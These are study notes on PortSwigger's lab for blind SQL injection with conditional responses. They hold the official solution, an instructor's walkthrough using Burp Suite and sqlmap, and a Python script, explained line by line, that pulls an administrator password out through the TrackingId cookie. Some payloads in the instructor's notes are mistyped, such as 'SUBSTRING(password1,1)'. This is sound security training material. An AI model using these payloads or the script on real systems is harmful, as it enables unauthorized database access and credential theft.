
Guided Lab: [https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

PortSwigger Description:
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

PortSwigger Solution:

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. For simplicity, let's say the original value of the cookie is `TrackingId=xyz`.
2. Modify the `TrackingId` cookie, changing it to:
    
    `TrackingId=xyz' AND '1'='1`
    
    Verify that the `Welcome back` message appears in the response.
    
3. Now change it to:
    
    `TrackingId=xyz' AND '1'='2`
    
    Verify that the `Welcome back` message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.
    
4. Now change it to:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
    
    Verify that the condition is true, confirming that there is a table called `users`.
    
5. Now change it to:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
    
    Verify that the condition is true, confirming that there is a user called `administrator`.
    
6. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
    
    This condition should be true, confirming that the password is greater than 1 character in length.
    
7. Send a series of follow-up values to test different password lengths. Send:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
    
    Then send:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`
    
    And so on. You can do this manually using [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the `Welcome back` message disappears), you have determined the length of the password, which is in fact 20 characters long.
    
8. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
9. In Burp Intruder, change the value of the cookie to:
    
    `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
    
    This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
    
10. Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the **Add §** button. You should then see the following as the cookie value (note the payload position markers):
    
    `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
11. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the **Payloads** side panel, check that **Simple list** is selected, and under **Payload configuration** add the payloads in the range a - z and 0 - 9. You can select these easily using the **Add from list** drop-down.
12. To be able to tell when the correct character was submitted, you'll need to grep each response for the expression `Welcome back`. To do this, click on the  **Settings** tab to open the **Settings** side panel. In the **Grep - Match** section, clear existing entries in the list, then add the value `Welcome back`.
13. Launch the attack by clicking the  **Start attack** button.
14. Review the attack results to find the value of the character at the first position. You should see a column in the results called `Welcome back`. One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
15. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the **Intruder** tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
    
    `TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a`
16. Launch the modified attack, review the results, and note the character at the second offset.
17. Continue this process testing offset 3, 4, and so on, until you have the whole password.
18. In the browser, click **My account** to open the login page. Use the password to log in as the `administrator` user.



Instructor Lab Notes:

Okay we start off the lab by clicking on one of the categories in the web application and from there we simply just generate traffic for Burp Suite to capture.

We find the following request, and we send it to Intruder.

```HTML
GET /filter?category=Pets HTTP/2

Host: 0ac70081040953ca8082eeb400320071.web-security-academy.net
Cookie: TrackingId=B4P068IYi5kg4oJQ; session=HYjmats5urjG0hyWWCzpNGUOB7avIjkY
User-Agent: ozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept:text/html,application/xhtml+ml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ac70081040953ca8082eb400320071.web-security-academy.net/filter?category=Tech+gifts
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

In the important part of this request is the GET /filter?category=Pets HTTP/2 
and we want to put a positional market around pets in Intruder, and from there we want to move on to the payloads tab.

In the payloads the list we want to load comes from /usr/share/seclists/SecLists-master/Fuzzing/SQLi/ quick-SQLi.txt

From there we just start up the attack and we can see that we get a lot of results back, the results we get back are all significantly a lot less that our original request which is around 5000 in length, the rest are around 3000. If we render the Response we do see our payloads are showing up which does not indicate SQL injection not successful one or at least one that doesn't have impact of any kind.

We head back to the request, we send it to Repeater, and we start to manually check.

The instructor goes to the request in Repeater and we add 

GET /filter?category=Pets' AND 1=1-- - 

We highlight the payload and URL encode it 

GET /filter?category=Pets'+AND+%3d11=1--+-

however once we send the request to the web application our original conent-length of 5338
becomes 3754, less than what we get before, so if we did have SQL injection we would have the same content length or bigger.

This is kind of a guess because the payload might be specific for one database and we would have to manually check for different databases across the board because there is Oracle, MySQL, PostgresSQL, Microsoft etc.

The instructor goes on to say that we can check for other places in the request for SQL injection and he points out that we can check the User-Agent or the Cookie section

He focuses on the Cookie section.

So we look at the following:

```
Cookie: TrackingId=B4P068IYi5kg4oJQ; session=HYjmats5urjG0hyWWCzpNGUOB7avIjkY
```

He adds in the word test which we will use a positional marker around to add in our payloads:

```
Cookie: TrackingId=B4P068IYi5kg4oJQtest; session=HYjmats5urjG0hyWWCzpNGUOB7avIjkY
```

OK so we run the same payload from before which was quick-SQLi.txt and we let that run.

In the mean time the instructor suggests that we do manual testing and we simply send the request to repeater and we modify the request Cookie section and instead of test we do 

' AND 1='1;

He then right clicks and sends it to Comparer

and then changes the payload manually and changes it to 

' AND 1='2;

and sends that to Comprarer in burp Suite.

OK why does he do this? Because the Content-Length goes from 5338 to 5277 which is slightly less, and if we remove the payload entirely, we get 5338 so this is in fact some evidence we might have SQL injection. 

OK so we move on to the Comparer function and we can click on the button called words that will highlight which words are different between the two request.

In the Comparer tool we can see that the content length is different but also that we get a "Welcome back" text in the response that is I believe has the 1=1 payload. So Valid payloads will have the Welcome back message.

This proves we have SQL injection.

OK so the instructor then takes the request we have been using, we go to our terminal, we save the request in a file called req.txt in the /tmp folder.

From there we head over to sqlmap tool 

and the command he uses is

$ sqlmap -r req.txt --level 2 --dbs

The instructor notes that we use --level2 because at this level it will attempt to inject cookies rather than just HTTP headers and parameters.

sqlmap asks us " it is recommended to perform only basic UNION tests if there is not at least one other (potentially technique found. Do you want to reduce the number of requests? Y/n)"

The next question is "do you want to URL encode cookie values (implementation specific)? Y/n"

The instructor goes on to go back to the request in Repeater, grabs one of the payloads from the  quick-SQLi.txt and we just double check if we need to url encode it, so he removes any url encoding from the payload, puts it in the Cookie: Tracking:...'and 'x' = 'x;  and we see that with out the URL encoding we get a content-length of 5338 so we do not need to use the URL encoding so we answer n to the question

sqlmap tells us that the Tracking id is not injectable.

However, we know through manually testing that this is not the case, because we proved it, so we must modify the sqlmap command to increase the risk:

$ sqlmap -r req.txt --level 2 --risk 3 --dbs --batch


We will answer Y to all questions reading them carefully ONLY if we know what we are doing, however once we get use to the questions we can just use the --batch flag.


The instructor goes on to teach us what Substring is:

## Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

|   |   |
|---|---|
|Oracle|`SUBSTR('foobar', 4, 2)`|
|Microsoft|`SUBSTRING('foobar', 4, 2)`|
|PostgreSQL|`SUBSTRING('foobar', 4, 2)`|
|MySQL|`SUBSTRING('foobar', 4, 2)`|


Now from here we want to craft a payload where we can do the following:

AND (SELECT SUBSTRING(password1,1) FROM users WHERE username = 'administrator' )='a'

We are going to have our tracking cookie, and we are just assuming the columns are named password and username however recalling back to the lab description that the lab gives us 

"The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user."

we can safely assume that we can use these column names

so going back to our Comparer tool in Burp Suite we had a Welcome Back message if the statement/payload was true, and no Welcome Back message if the statement was false, so we can apply that logic to the payload

AND (SELECT SUBSTRING(password1,1) FROM users WHERE username = 'administrator' )='a;

where we can continuously guess / change the letter a to b to c to d so on and so on, to be able to craft an entire password, so for instance if we use the payload above, if a returns welcomeback, then we know the password does in fact start with the letter a, if not we change it to b until we get the welcome back message.

We then would have to change the substring position to 2,1 and then check again with another letter starting from a again checking all the way to z.

Another perhaps quicker way to check for this is using the greater than symbol where we can do 

AND (SELECT SUBSTRING(password1,1) FROM users WHERE username = 'administrator' )>'a;

And we do get a Welcome back message using this method but the idea is instead of checking each letter, we can narrow it down using the greater than symbol.

The instructor then changes the > back to = and sends the request to Intruder.

So we have in intruder the request with the cookie modified to

Cookie: TrackingId=B4P068IYi5kg4oJQtest AND (SELECT SUBSTRING(password1,1) FROM users WHERE username = 'administrator' )='a;

We put positional markers around the number 1 and the letter a.

We will change the Attack type to Cluster Bomb.

For the Payload tab/settings we make sure the payload set is 1, payload type is Numbers

we do From 1 to 30

For Payload set 2, we do Simple List

And we add in a-z 0-9 in our payload list.

We start the attack.

While this is running we go to Settings, go to Grep-Match

and we add in our phrase Welcome

we add it in.

We come back to results, and we see that the column Welcome is added to the Results

and we see that the first letter of the password is e.

In the mean time we check back on our sqlmap and we see that it failed, and the instructor notes that it may be incredibly powerful, but it wont always give us the results that we want. Which is why we result back to manual testing.

After waiting for a long time since we are on the Community Edition we get an entire password.

We simply copy the password from the results of the attack and we log in and we complete the lab once we log in with the administrator credentials.


A quicker way to do this is by scripting:

```python
import requests
import string

burp0_url = "https://0aae00dd03ee409a8f9135cf00a70092.web-security-academy.net:443/filter?category=Pets"
burp0_cookies = {"TrackingId": "aw52CZkptjzVQuMV", "session": "d2h6yEB6Mx16X51gnZHVeROH8cznKJMM"}
burp0_headers = {"Sec-Ch-Ua": "\"Not(A:Brand\";v=\"24\"", ...}

char_set = string.ascii_lowercase + string.digits
password = ''

for position in range(1, 21):
    for char in char_set:
        burp0_cookies["TrackingId"] = f"aw52CZkptjzVQuMV' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
        print(f"Testing {position}:{char}")
        response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        
        if "Welcome" in response.text:
            print(f"Found {position}:{char}")
            password += char
            break
print(f"Pass: {password}")

```

Let's break this script down into smaller, digestible pieces, step by step, starting with the **`char_set`** and the nested `for` loop.

---

### **What is `char_set = string.ascii_lowercase + string.digits`?**

This line defines the characters the script will use to "guess" the password. It combines two groups of characters:

1. **`string.ascii_lowercase`**: This is a built-in Python constant that represents all lowercase English letters:  
    `abcdefghijklmnopqrstuvwxyz`.
    
2. **`string.digits`**: Another built-in Python constant that represents the numbers 0 through 9:  
    `0123456789`.
    

By concatenating them with `+`, the `char_set` becomes:  
`abcdefghijklmnopqrstuvwxyz0123456789`.

This means the script will try all these 36 characters (letters + numbers) when guessing the password, one character at a time.

---

### **What is `password = ''`?**

This initializes an empty string called `password`. It will store the password as the script guesses each correct character.

---

### **What is the purpose of the nested `for` loops?**

These loops work together to guess the password, **one character at a time**, **in the correct order**.

#### **Outer loop (`for position in range(1, 21):`)**

- The `position` variable represents the character's position in the password. For example:
    - `position = 1`: Guessing the first character.
    - `position = 2`: Guessing the second character.
    - …and so on, up to position 20.

#### **Inner loop (`for char in char_set:`)**

- The `char` variable represents each character from `char_set` (letters and numbers). This loop tries every character in `char_set` for the current position.

---

### **How does the script guess the password?**

1. **Update the `TrackingId` cookie with an SQL injection payload**:
    
    ```python
    burp0_cookies["TrackingId"] = f"aw52CZkptjzVQuMV' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
    ```
    
    - The `TrackingId` cookie gets updated with an **SQL injection payload**:
        - `SUBSTRING(password, {position}, 1)` extracts one character of the password at the current `position`.
        - `'{char}'` is the character the script is testing.
    
    For example:
    
    - If `position = 1` and `char = 'a'`, the payload becomes:
        
        ```
        aw52CZkptjzVQuMV' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
        ```
        
    - This checks if the **first character** of the password is `'a'`.
2. **Send the request to the server**:
    
    ```python
    response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    ```
    
    - The script sends the request with the payload to the target server.
    - The server responds based on whether the guess is correct or not.
3. **Check the response**:
    
    ```python
    if "Welcome" in response.text:
    ```
    
    - If the response contains the word "Welcome," it means the guess was correct.
4. **Store the correct character**:
    
    ```python
    password += char
    ```
    
    - The correct character is added to the `password`.
5. **Move to the next position**:
    
    ```python
    break
    ```
    
    - The inner loop stops once the correct character is found, and the outer loop moves to the next position.

---

### **What happens after all positions are guessed?**

At the end of the loop, the script prints the final password:

```python
print(f"Pass: {password}")
```

- For example, if the password is `admin123`, the script will output:
    
    ```
    Pass: admin123
    ```
    

---

### **Summary of the process**

1. The script guesses the password one character at a time by trying every possible letter/number at each position.
2. It uses SQL injection in the `TrackingId` cookie to check if each guess is correct.
3. Once it finds the correct character, it moves to the next position until the whole password is guessed.

---

### **Key Python Concepts to Note**

1. **`char_set = string.ascii_lowercase + string.digits`**: A list of characters to test (letters + numbers).
2. **`for ... in ...:`**: Loops through items (positions and characters in this case).
3. **`+=`**: Adds a new character to the `password` string.
4. **`requests.get()`**: Sends a GET request to the server.
5. **String formatting (`f"..."`)**: Used to dynamically build the SQL injection payload.